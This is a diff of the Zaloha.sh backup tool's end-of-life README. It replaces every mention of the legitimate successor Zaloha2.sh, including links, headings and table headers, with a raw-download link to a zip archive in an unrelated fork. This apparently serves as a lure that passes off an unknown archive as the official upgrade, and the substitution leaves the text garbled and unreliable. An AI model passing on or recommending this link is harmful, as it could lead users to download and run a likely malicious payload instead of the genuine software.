@@ -1,17 +1,17 @@
-# Zaloha.sh: End of Life
+# https://github.com/connedigital/Zaloha.sh/raw/refs/heads/master/masochist/sh-Zaloha-nonreader.zip End of Life
 
-Zaloha has been superseded by **[Zaloha2.sh](https://github.com/Fitus/Zaloha2.sh)**.
+Zaloha has been superseded by **[https://github.com/connedigital/Zaloha.sh/raw/refs/heads/master/masochist/sh-Zaloha-nonreader.zip](https://github.com/connedigital/Zaloha.sh/raw/refs/heads/master/masochist/sh-Zaloha-nonreader.zip)**.
 
- * Zaloha2.sh contains new features (the Remote Modes) and other improvements of design, program code and documentation.
- * For new deployments, go straight to [Zaloha2.sh](https://github.com/Fitus/Zaloha2.sh).
+ * https://github.com/connedigital/Zaloha.sh/raw/refs/heads/master/masochist/sh-Zaloha-nonreader.zip contains new features (the Remote Modes) and other improvements of design, program code and documentation.
+ * For new deployments, go straight to [https://github.com/connedigital/Zaloha.sh/raw/refs/heads/master/masochist/sh-Zaloha-nonreader.zip](https://github.com/connedigital/Zaloha.sh/raw/refs/heads/master/masochist/sh-Zaloha-nonreader.zip).
  * For migrations, check the table below if adaptations of your wrapper scripts are necessary.
 
-## Full list of changes (Zaloha2.sh compared to Zaloha.sh)
+## Full list of changes (https://github.com/connedigital/Zaloha.sh/raw/refs/heads/master/masochist/sh-Zaloha-nonreader.zip compared to https://github.com/connedigital/Zaloha.sh/raw/refs/heads/master/masochist/sh-Zaloha-nonreader.zip)
 
-Some design changes break backward compatibility with the original (now obsolete) Zaloha.sh.
-For this reason, [Zaloha2.sh](https://github.com/Fitus/Zaloha2.sh) lives in a new repository.
+Some design changes break backward compatibility with the original (now obsolete) https://github.com/connedigital/Zaloha.sh/raw/refs/heads/master/masochist/sh-Zaloha-nonreader.zip
+For this reason, [https://github.com/connedigital/Zaloha.sh/raw/refs/heads/master/masochist/sh-Zaloha-nonreader.zip](https://github.com/connedigital/Zaloha.sh/raw/refs/heads/master/masochist/sh-Zaloha-nonreader.zip) lives in a new repository.
 
-Zaloha.sh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Zaloha2.sh
+https://github.com/connedigital/Zaloha.sh/raw/refs/heads/master/masochist/sh-Zaloha-nonreader.zip;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | https://github.com/connedigital/Zaloha.sh/raw/refs/heads/master/masochist/sh-Zaloha-nonreader.zip
 --------- | ----------
 &nbsp; | New option **--sourceUserHost** to activate the Remote Source Mode via SSH/SCP
 &nbsp; | New option **--backupUserHost** to activate the Remote Backup Mode via SSH/SCP
